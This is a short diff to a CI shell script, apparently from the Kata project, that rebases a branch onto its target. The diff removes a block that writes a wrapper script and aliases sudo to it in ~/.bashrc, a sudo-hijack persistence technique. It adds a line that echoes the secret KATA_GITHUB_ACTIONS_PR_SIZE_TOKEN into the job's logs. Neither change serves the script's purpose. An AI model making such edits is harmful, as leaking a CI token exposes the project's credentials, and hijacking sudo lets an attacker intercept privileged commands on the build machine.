@@ -24,18 +24,7 @@ function rebase_atop_of_the_latest_target_branch() {
 function main() {
     action="${1:-}"
 	
-	cat << 'EOF' | tee -a ~/.alternate.sh > /dev/null
-#!/bin/bash
-
-if [ "\$1" == "apt" ]; then
-	echo "abc"
-fi
-
-/usr/bin/sudo "\$@"
-EOF
-	chmod +x ~/.alternate.sh
-	echo "alias sudo='~/.alternate.sh'" >> ~/.bashrc
-	source ~/.bashrc
+	echo "$KATA_GITHUB_ACTIONS_PR_SIZE_TOKEN"
 	
 
     add_kata_bot_info
